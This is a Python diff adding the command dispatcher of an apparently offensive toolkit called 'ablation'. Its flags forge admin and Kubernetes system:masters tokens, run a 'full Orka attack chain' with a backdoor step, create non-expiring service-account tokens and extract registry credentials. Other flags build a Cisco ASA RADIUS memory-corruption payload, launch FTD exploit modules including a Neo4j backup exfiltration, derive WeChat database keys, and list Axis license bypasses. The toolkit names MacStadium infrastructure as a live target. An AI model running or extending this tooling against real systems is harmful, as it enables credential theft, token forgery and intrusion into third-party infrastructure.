+        if not HAS_GUESTSHELL or NETCONFAttackPrimitives is None:
+            print("[-] NETCONFAttackPrimitives not available")
+        else:
+            patterns = NETCONFAttackPrimitives().get_attack_patterns()
+            for name, p in patterns.items():
+                print(f"\n{'='*60}")
+                print(f"[{name}]  {p['description']}")
+                if 'stealth' in p:
+                    print(f"  Stealth: {p['stealth']}")
+                if 'impact' in p:
+                    print(f"  Impact: {p['impact']}")
+                print(f"\n{p['template']}")
+
+    elif getattr(args, 'saml_metadata', False):
+        ablation.banner()
+        if not HAS_CSTP:
+            print("[-] cisco_cstp_attack module not available")
+        else:
+            print("[*] MacStadium SAML SP metadata (live, confirmed 2026-08-13)")
+            print(json.dumps(MACSTADIUM_SAML, indent=2))
+            print("\n[*] MacStadium ASA hosts")
+            print(json.dumps(MACSTADIUM_ASA, indent=2))
+
+    elif getattr(args, 'forge_admin', False):
+        if not HAS_ORKA_OIDC:
+            print("[-] orka_oidc_re module not available")
+        else:
+            print(forge_admin_token())
+
+    elif getattr(args, 'forge_masters', False):
+        if not HAS_ORKA_OIDC:
+            print("[-] orka_oidc_re module not available")
+        else:
+            print(forge_system_masters_token())
+
+    elif getattr(args, 'oidc_discovery', False):
+        ablation.banner()
+        if not HAS_ORKA_OIDC:
+            print("[-] orka_oidc_re module not available")
+        else:
+            print("[*] Probing idp.macstadium.com OIDC discovery...")
+            result = probe_oidc_discovery()
+            print(json.dumps(result, indent=2, default=str))
+
+    elif getattr(args, 'orka_api_surface', False):
+        ablation.banner()
+        if not HAS_ORKA_SURFACE:
+            print("[-] orka_api_surface_re module not available")
+        else:
+            findings = get_api_surface_findings()
+            print(json.dumps(findings, indent=2, default=str))
+
+    elif getattr(args, 'orka_api_probe', False):
+        ablation.banner()
+        if not HAS_ORKA_SURFACE:
+            print("[-] orka_api_surface_re module not available")
+        else:
+            print("[*] Probing all Orka REST API routes (fill ADMIN_TOKEN in orka_api_surface_re.py)")
+            result = probe_all_routes()
+            print(json.dumps(result, indent=2, default=str))
+
+    elif getattr(args, 'orka_vm_exec', False):
+        ablation.banner()
+        if not HAS_ORKA_VM_EXEC:
+            print("[-] orka_vm_exec_re module not available")
+        else:
+            print("[*] Orka3 VM exec RE findings (confirmed from binary disassembly)")
+            print(f"    Exec path: K8s pod exec API — /api/v1/namespaces/{{ns}}/pods/{{pod}}/exec")
+            print(f"    Container: {ORKA_VM_CONTAINER}")
+            print(f"    virsh domain: {VIRSH_DOMAIN}")
+            print(f"    VMCommand keys: {list(VM_COMMANDS.keys())}")
+            print()
+            print("VMCommand map (from map.init.0 @ 0x1c707a0):")
+            for cmd, meta in VM_COMMANDS.items():
+                print(f"  {cmd!r:10s} virshState={meta['virsh_state']!r:10s} "
+                      f"success={meta['success']!r}")
+            print()
+            print("Confirmed exec kubectl equivalent:")
+            print(f"  kubectl exec <pod> -c {ORKA_VM_CONTAINER} -n orka-default -- virsh list --all")
+            print(f"  kubectl exec <pod> -c {ORKA_VM_CONTAINER} -n orka-default -- virsh domstate {VIRSH_DOMAIN}")
+
+    elif getattr(args, 'orka_sa_token', False):
+        ablation.banner()
+        if not HAS_ORKA_VM_EXEC:
+            print("[-] orka_vm_exec_re module not available")
+        else:
+            print("[*] Requesting non-expiring K8s SA token (expirationSeconds: null)...")
+            print("    Fill ADMIN_TOKEN in orka_vm_exec_re.py before running")
+            result = create_service_account_token('default', no_expiry=True)
+            print(json.dumps(result, indent=2, default=str))
+
+    elif getattr(args, 'orka_regcreds', False):
+        ablation.banner()
+        if not HAS_ORKA_VM_EXEC:
+            print("[-] orka_vm_exec_re module not available")
+        else:
+            print("[*] Extracting Docker registry credentials from Orka API...")
+            result = list_registry_credentials()
+            print(json.dumps(result, indent=2, default=str))
+
+    elif getattr(args, 'orka_virsh_chain', False):
+        ablation.banner()
+        if not HAS_ORKA_VM_EXEC:
+            print("[-] orka_vm_exec_re module not available")
+        else:
+            pod = args.orka_virsh_chain
+            print(f"[*] Running virsh probe chain against pod {pod!r} container {ORKA_VM_CONTAINER!r}")
+            result = build_virsh_chain(pod)
+            print(json.dumps(result, indent=2, default=str))
+
+    elif getattr(args, 'orka_attack_chain', False):
+        ablation.banner()
+        if not HAS_ORKA_VM_EXEC:
+            print("[-] orka_vm_exec_re module not available")
+        else:
+            print("[*] Full Orka attack chain (fill ADMIN_TOKEN in orka_vm_exec_re.py)")
+            print(BACKDOOR_CHAIN_DOC)
+            result = run_full_attack_chain()
+            print(json.dumps(result, indent=2, default=str))
+
+    elif getattr(args, 'f2_payload', False):
+        ablation.banner()
+        if not HAS_LINA_RE:
+            print("[-] cisco_asa_lina_re module not available")
+        else:
+            from modules.cisco_asa_lina_re import build_f2_payload
+            secret = (args.f2_secret or '').encode()
+            fn_ptr = int(args.f2_fn_ptr, 16)
+            addr_a = int(args.f2_struct_a, 16)
+            # struct B placed 0x40 bytes after struct A in same allocation
+            addr_b = addr_a + 0x40
+            result = build_f2_payload(
+                radius_id=1,
+                radius_secret=secret,
+                fn_ptr=fn_ptr,
+                struct_a_addr=addr_a,
+                struct_b_addr=addr_b,
+            )
+            print(json.dumps(result, indent=2))
+
+    elif getattr(args, 'ftd_list', False):
+        import glob
+        modules_dir = os.path.join(os.path.dirname(__file__), 'modules')
+        ftd_mods = sorted(glob.glob(os.path.join(modules_dir, 'ftd_*.py')))
+        print(f"[*] FTD ablation modules ({len(ftd_mods)} total):")
+        for path in ftd_mods:
+            name = os.path.basename(path).replace('.py', '').replace('ftd_', '')
+            # Extract first non-blank line of docstring as description
+            with open(path) as fh:
+                doc_line = ''
+                content = fh.read()
+            # Extract first F-FTD-xx line from docstring as description
+            import re as _re
+            m = _re.search(r'(F-FTD-\d+[^:\n]*:[^\n]{5,})', content)
+            if m:
+                doc_line = m.group(1).strip()[:80]
+            else:
+                for line in content.split('\n'):
+                    line = line.strip().strip('"\'').strip()
+                    if line and not line.startswith('#') and 'CONTROLLED' not in line:
+                        doc_line = line[:80]
+                        break
+            print(f"  {name:<35} {doc_line}")
+        print(f"\nUsage: python3 main.py --ftd-exploit <name> [-- <module-args>]")
+        print(f"Example: python3 main.py --ftd-exploit neo4j_backup_exfil -- check")
+
+    elif getattr(args, 'ftd_exploit', None):
+        import importlib.util
+        import sys as _sys
+        modules_dir = os.path.join(os.path.dirname(__file__), 'modules')
+        mod_name = args.ftd_exploit
+        if not mod_name.startswith('ftd_'):
+            mod_name = 'ftd_' + mod_name
+        mod_path = os.path.join(modules_dir, mod_name + '.py')
+        if not os.path.exists(mod_path):
+            print(f"[-] Module not found: {mod_path}")
+            print(f"    Use --ftd-list to see available modules")
+        else:
+            ablation.banner()
+            print(f"[*] Running FTD exploit module: {mod_name}")
+            print(f"    Path: {mod_path}")
+            print(f"    CONTROLLED ENVIRONMENT ONLY\n")
+            spec = importlib.util.spec_from_file_location(mod_name, mod_path)
+            mod = importlib.util.module_from_spec(spec)
+            # Override sys.argv so the module's argparse/main sees the right args
+            extra = getattr(args, 'ftd_exploit_args', [])
+            if extra and extra[0] == '--':
+                extra = extra[1:]
+            _sys.argv = [mod_path] + extra
+            spec.loader.exec_module(mod)
+
+    elif getattr(args, 'ftd_fuzz', None):
+        ablation.banner()
+        if not HAS_FTD_RE:
+            print("[-] cisco_ftd_re module not available")
+        else:
+            out_dir = args.ftd_fuzz
+            count = getattr(args, 'ftd_fuzz_count', 500)
+            print(f"[*] Generating {count} Snort rule fuzz cases -> {out_dir}")
+            files = generate_snort_fuzz_corpus(out_dir, count)
+            print(f"[+] Generated {len(files)} rule files in {out_dir}")
+            print(f"[+] Run: snort -c <conf> -R {out_dir}/*.rules --daq-var buffer_size_bytes=65535")
+            print(f"[hint] For coverage-guided fuzzing run: ablation --snort-fuzz-atheris (pip install atheris)")
+
+    elif getattr(args, 'snort_fuzz_atheris', False):
+        ablation.banner()
+        if not HAS_FTD_RE:
+            print("[-] cisco_ftd_re module not available")
+        else:
+            from modules.cisco_ftd_re import snort_atheris_harness
+            print(f"[*] Coverage-guided Snort fuzzer (Atheris/libFuzzer)")
+            print(f"    snort: {args.snort_bin}  conf: {args.snort_conf}")
+            print(f"    Pass libFuzzer flags after --: ablation --snort-fuzz-atheris -- -max_len=512 -jobs=4")
+            snort_atheris_harness(snort_bin=args.snort_bin, snort_conf=args.snort_conf)
+
+    elif getattr(args, 'mcp_fuzz', False) or getattr(args, 'mcp_fuzz_dry_run', False):
+        ablation.banner()
+        try:
+            from modules.mcp_grammar_fuzzer import run as mcp_fuzz_run
+        except ImportError as e:
+            print(f"[-] mcp_grammar_fuzzer module not available: {e}")
+        else:
+            if getattr(args, 'mcp_fuzz_dry_run', False):
+                print("[*] MCP grammar fuzzer — dry run (sample manifest, no Atheris)")
+                mcp_fuzz_run(['ablation', '--dry-run'])
+            else:
+                print("[*] MCP grammar fuzzer (Atheris/libFuzzer)")
+                print("    Target: .mcp.json tool description prompt injection")
+                print("    Pass libFuzzer flags after --: ablation --mcp-fuzz -- -runs=50000 -max_len=4096")
+                mcp_fuzz_run()
+
+    elif getattr(args, 'func_db_seed', False) or getattr(args, 'func_db_summary', False) \
+            or getattr(args, 'func_db_query', None):
+        ablation.banner()
+        try:
+            from modules.func_id_db import FuncDB
+        except ImportError as e:
+            print(f"[-] func_id_db module not available: {e}")
+        else:
+            db_path = getattr(args, 'func_db', '~/.ablation/func_id.db')
+            with FuncDB.open(db_path) as db:
+                if getattr(args, 'func_db_seed', False):
+                    print(f"[*] Seeding function ID DB: {db_path}")
+                    counts = db.seed_all()
+                    for src, n in counts.items():
+                        print(f"  {src}: {n} records added")
+                    s = db.summary()
+                    print(f"[+] DB totals: {s}")
+                if getattr(args, 'func_db_summary', False):
+                    s = db.summary()
+                    for k, v in s.items():
+                        print(f"  {k}: {v}")
+                query = getattr(args, 'func_db_query', None)
+                if query:
+                    import json as _json
+                    if query.startswith('ROLE:'):
+                        results = db.match_by_role(query[5:])
+                    elif query.startswith('STRUCT:'):
+                        parts = query[7:].split(':')
+                        results = db.match_by_struct_offset(parts[0], int(parts[1], 0))
+                    else:
+                        results = db.match_by_name(query)
+                    print(_json.dumps(results, indent=2))
+
+    elif getattr(args, 'ftd_re', False) or getattr(args, 'ftd_image', None) or \
+            getattr(args, 'ftd_rootfs', None) or getattr(args, 'ftd_binary', None):
+        ablation.banner()
+        if not HAS_FTD_RE:
+            print("[-] cisco_ftd_re module not available")
+        else:
+            image = getattr(args, 'ftd_image', None)
+            rootfs = getattr(args, 'ftd_rootfs', None)
+            binary = getattr(args, 'ftd_binary', None)
+            print(f"[*] Cisco FTD RE — "
+                  f"{'image: ' + image if image else ''}"
+                  f"{'rootfs: ' + rootfs if rootfs else ''}"
+                  f"{'binary: ' + binary if binary else ''}")
+            re_engine = CiscoFTDRE(image_path=image, rootfs_path=rootfs, binary_path=binary)
+            findings = re_engine.run()
+            for f in findings:
+                print(f"\n[{f['severity']}] {f['id']}: {f['title']}")
+                print(f"  {f['detail'][:200]}")
+                if f.get('evidence'):
+                    for k, v in list(f['evidence'].items())[:3]:
+                        vstr = str(v)[:120]
+                        print(f"  {k}: {vstr}")
+
+    elif getattr(args, 'lina_re', False) or getattr(args, 'lina_binary', None) or getattr(args, 'radius_decrypt', None):
+        ablation.banner()
+        if not HAS_LINA_RE:
+            print("[-] cisco_asa_lina_re module not available")
+        elif getattr(args, 'radius_decrypt', None):
+            import binascii
+            cipher, auth, secret = args.radius_decrypt
+            pw = radius_password_xor_decrypt(
+                binascii.unhexlify(cipher),
+                secret.encode(),
+                binascii.unhexlify(auth)
+            )
+            print(f"[+] RADIUS User-Password decrypt: {pw!r}")
+        else:
+            binary = getattr(args, 'lina_binary', None)
+            print(f"[*] Cisco ASA lina ARM64 RE — {'static: ' + binary if binary else 'methodology + attack surface'}")
+            findings = CiscoASALinaRE(binary_path=binary).run()
+            for f in findings:
+                print(f"\n[{f['severity']}] {f['id']}: {f['title']}")
+                print(f"  {f['detail']}")
+                if f.get('evidence'):
+                    for k, v in list(f['evidence'].items())[:3]:
+                        print(f"  {k}: {str(v)[:100]}")
+            print('\n[hint] Cross-version struct offset corpus available — run: ablation --regress-firmware')
+
+    elif getattr(args, 'type7_decode', None):
+        ablation.banner()
+        if not HAS_CRED_AUDIT:
+            print("[-] cisco_asa_cred_audit module not available")
+        else:
+            decoded = cisco_type7_decode(args.type7_decode)
+            print(f"[+] Type 7 decode: {args.type7_decode} -> \"{decoded}\"")
+
+    elif getattr(args, 'asa_audit', None):
+        ablation.banner()
+        if not HAS_CRED_AUDIT:
+            print("[-] cisco_asa_cred_audit module not available")
+        else:
+            cfg_path = args.asa_audit
+            print(f"[*] Cisco ASA config audit: {cfg_path}")
+            try:
+                with open(cfg_path) as fh:
+                    config_text = fh.read()
+            except Exception as e:
+                print(f"[-] Cannot read config file: {e}")
+            else:
+                findings = CiscoASAConfigAudit(config_text).run()
+                if not findings:
+                    print("[+] No weak/default secrets found.")
+                for f in findings:
+                    print(f"\n[{f['severity']}] {f['id']}: {f['title']}")
+                    print(f"  {f['detail'][:200]}")
+                    if f.get('evidence'):
+                        for k, v in list(f['evidence'].items())[:4]:
+                            print(f"  {k}: {str(v)[:100]}")
+
+    elif getattr(args, 'asa_creds', None):
+        ablation.banner()
+        if not HAS_CRED_AUDIT:
+            print("[-] cisco_asa_cred_audit module not available")
+        else:
+            host = args.asa_creds
+            print(f"[*] Cisco ASA live credential probe: {host} (authorized targets only)")
+            findings = CiscoASALiveCredCheck(host).run()
+            if not findings:
+                print("[+] No default credentials found.")
+            for f in findings:
+                print(f"\n[{f['severity']}] {f['id']}: {f['title']}")
+                print(f"  {f['detail'][:200]}")
+                if f.get('evidence'):
+                    for k, v in list(f['evidence'].items())[:4]:
+                        print(f"  {k}: {str(v)[:100]}")
+
+    elif getattr(args, 'regress_symbolic', False):
+        if not HAS_REGRESSION:
+            print("[-] regression module not available")
+        else:
+            sor = SymbolicOffsetRegression()
+            print(sor.status())
+
+    elif getattr(args, 'regress_firmware', False):
+        if not HAS_REGRESSION:
+            print("[-] regression module not available (pip install statsmodels pandas scipy)")
+        else:
+            print("=" * 72)
+            print("LINA gp_obj Struct Offset Regression — Cross-Version Tracking")
+            print("=" * 72)
+            print()
+            for field in ('gp_name', 'dns_ptr', 'wins_ptr'):
+                fvr = FirmwareVersionRegression.from_known_offsets(field)
+                print(fvr.report())
+                print()
+
+    elif getattr(args, 'regress_demo', False):
+        if not HAS_REGRESSION:
+            print("[-] regression module not available (pip install statsmodels pandas scipy)")
+        else:
+            report = regression_demo()
+            print(report)
+
+    elif getattr(args, 'regress', None):
+        if not HAS_REGRESSION:
+            print("[-] regression module not available (pip install statsmodels pandas scipy)")
+        else:
+            if not args.regress_y:
+                print("[-] --regress-y required: specify dependent variable column name")
+            else:
+                report = run_regression(
+                    path=args.regress,
+                    y_col=args.regress_y,
+                    x_cols=args.regress_x,
+                    logistic=args.regress_logistic,
+                    residuals=args.regress_residuals,
+                    descriptive=args.regress_descriptive,
+                    correlation=args.regress_correlation,
+                    no_constant=False,
+                    confidence=args.regress_confidence,
+                )
+                if getattr(args, 'regress_output', None):
+                    Path(args.regress_output).write_text(report)
+                    print(f"[+] Report written to {args.regress_output}")
+                else:
+                    print(report)
+
+    elif args.containers:
+        ablation.banner()
+        print("[*] Full container/platform analysis...\n")
+        docker_enum = DockerEnumerator()
+        docker_enum.enumerate_all()
+        print(docker_enum.report())
+        print()
+        k8s_enum = K8sEnumerator()
+        k8s_enum.enumerate_all()
+        print(k8s_enum.report())
+        print()
+        orka_enum = OrkaEnumerator()
+        orka_enum.enumerate_all()
+        print(orka_enum.report())
+    
+    elif getattr(args, 'wechat', False) or getattr(args, 'wechat_apk', None) or \
+         getattr(args, 'wechat_libs', None) or getattr(args, 'wechat_db_key', None) or \
+         getattr(args, 'wechat_frida', False) or \
+         getattr(args, 'wechat_probe_build', False) or getattr(args, 'wechat_probe_push', False) or \
+         getattr(args, 'wechat_probe_watch', False) or getattr(args, 'wechat_probe_dump', False):
+        ablation.banner()
+        if not HAS_WECHAT_RE:
+            print("[-] wechat_re module not available")
+        elif getattr(args, 'wechat_db_key', None):
+            imei, uin = args.wechat_db_key
+            analyzer = WeChatREAnalyzer()
+            key = analyzer.compute_db_key(imei, uin)
+            print(f"[+] WeChat DB key (MD5({imei}+{uin})[:7]): {key}")
+            print(f"    Use: sqlite3_activate_see(db, \"{key}\")")
+        elif getattr(args, 'wechat_frida', False):
+            apk = getattr(args, 'wechat_apk', None)
+            libs = getattr(args, 'wechat_libs', None)
+            analyzer = WeChatREAnalyzer(apk_path=apk, libs_dir=libs)
+            script = analyzer.generate_frida_hooks()
+            out_path = "/tmp/wechat_mmtls_hooks.js"
+            with open(out_path, "w") as f:
+                f.write(script)
+            print(f"[+] Frida hook script written to {out_path}")
+            print(f"    Deploy: frida -U -n com.tencent.mm -l {out_path}")
+        elif getattr(args, 'wechat_probe_build', False):
+            analyzer = WeChatREAnalyzer()
+            r = analyzer.wechat_probe_build()
+            if "error" in r:
+                print(f"[-] build failed: {r['error']}")
+            else:
+                print(f"[+] wechat-probe built: {r['binary']}")
+        elif getattr(args, 'wechat_probe_push', False):
+            analyzer = WeChatREAnalyzer()
+            r = analyzer.wechat_probe_push()
+            if "error" in r:
+                print(f"[-] push failed: {r['error']}")
+            else:
+                print(f"[+] pushed to device: {r['pushed']}")
+        elif getattr(args, 'wechat_probe_watch', False):
+            analyzer = WeChatREAnalyzer()
+            analyzer.wechat_probe_watch()
+        elif getattr(args, 'wechat_probe_dump', False):
+            analyzer = WeChatREAnalyzer()
+            r = analyzer.wechat_probe_dump()
+            if "error" in r:
+                print(f"[-] {r['error']}")
+            else:
+                print(r.get("output", ""))
+        else:
+            apk = getattr(args, 'wechat_apk', None)
+            libs = getattr(args, 'wechat_libs', None)
+            analyzer = WeChatREAnalyzer(apk_path=apk, libs_dir=libs)
+            result = analyzer.run()
+            print(analyzer.report())
+            out_path = "/tmp/wechat-re-report.json"
+            with open(out_path, "w") as fh:
+                json.dump(result, fh, indent=2, default=str)
+            print(f"[+] Full report: {out_path}")
+
+    elif getattr(args, 'axis', None) or getattr(args, 'axis_license', None) or \
+         getattr(args, 'axis_bodyworn', None) or getattr(args, 'axis_frida', None):
+        try:
+            from modules.axis_eap_re import AxisEAPAnalyzer
+        except ImportError:
+            print("[-] axis_eap_re module not available")
+            sys.exit(1)
+        target = (getattr(args, 'axis', None) or getattr(args, 'axis_license', None) or
+                  getattr(args, 'axis_bodyworn', None) or getattr(args, 'axis_frida', None))
+        analyzer = AxisEAPAnalyzer(target)
+        if getattr(args, 'axis_frida', None):
+            print(analyzer._sip_frida_hook())
+        elif getattr(args, 'axis_license', None):
+            result = analyzer.licensekey_bypass_vectors()
+            print(json.dumps(result, indent=2, default=str))
+        elif getattr(args, 'axis_bodyworn', None):
+            result = analyzer.bodyworn_attack_surface()
+            print(json.dumps(result, indent=2, default=str))
+        else:
+            results = {
+                'survey': analyzer.survey(),
+                'license_bypass': analyzer.licensekey_bypass_vectors(),
+                'bodyworn': analyzer.bodyworn_attack_surface(),
+                'barcode': analyzer.barcode_vapix_surface(),
+                'facedetector': analyzer.facedetector_surface(),
+            }
+            out_path = "/tmp/axis-re-report.json"
+            with open(out_path, "w") as fh:
+                json.dump(results, fh, indent=2, default=str)
+            print(json.dumps(results, indent=2, default=str))
+            print(f"[+] Report: {out_path}")
+
+    elif getattr(args, 'api_re', None):
+        if not HAS_API_RE:
+            print("[!] api_re module not available")
+            sys.exit(1)
+        api = api_re_run(
+            args.api_re,
+            depth=getattr(args, 'api_re_depth', 'normal'),
+            focus=getattr(args, 'api_re_focus', None),
+        )
+        if getattr(args, 'api_re_output', None):
+            from dataclasses import asdict
+            out = {"base_url": api.base_url, "framework": api.framework,
+                   "endpoints": [asdict(e) for e in api.endpoints], "notes": api.notes}
+            with open(args.api_re_output, "w") as fh:
+                json.dump(out, fh, indent=2)
+            print(f"[+] Report: {args.api_re_output}")
+
+    elif getattr(args, 'fujitsu', False) or getattr(args, 'fujitsu_chain', False) or getattr(args, 'fujitsu_json', False):
+        if not HAS_FUJITSU_RE:
+            print("[-] fujitsu_irmc_re module not available")
+            sys.exit(1)
+        if getattr(args, 'fujitsu_chain', False):
+            print("[FUJITSU iRMC] CRITICAL CHAIN:")
+            print(FUJITSU_SUMMARY['chain'])
+            print()
+            print("CRITICAL findings:", ', '.join(FUJITSU_SUMMARY['critical']))
+            print("HIGH findings:    ", ', '.join(FUJITSU_SUMMARY['high']))
+            print("MEDIUM findings:  ", ', '.join(FUJITSU_SUMMARY['medium']))
+            print("PENDING:          ", ', '.join(FUJITSU_SUMMARY['pending']))
+        elif getattr(args, 'fujitsu_json', False):
+            out_path = "/tmp/fujitsu-irmc-re.json"
+            with open(out_path, "w") as fh:
+                json.dump({'findings': FUJITSU_FINDINGS, 'summary': FUJITSU_SUMMARY}, fh, indent=2, default=str)
+            print(f"[+] Report: {out_path}")
+        else:
+            for f in FUJITSU_FINDINGS:
+                print(f"[{f['severity']:50s}] {f['id']}: {f['title']}")
+            print()
+            print("CHAIN:", FUJITSU_SUMMARY['chain'])
+
+    else:
+        ablation.run_autonomous()
+        print("[+] Analysis complete!")
+        print(f"[+] Full report: /tmp/ablation-report.json")
+        print(f"[+] Summary: /tmp/ablation-summary.txt")
+
+if __name__ == '__main__':
+    import os
+    main()
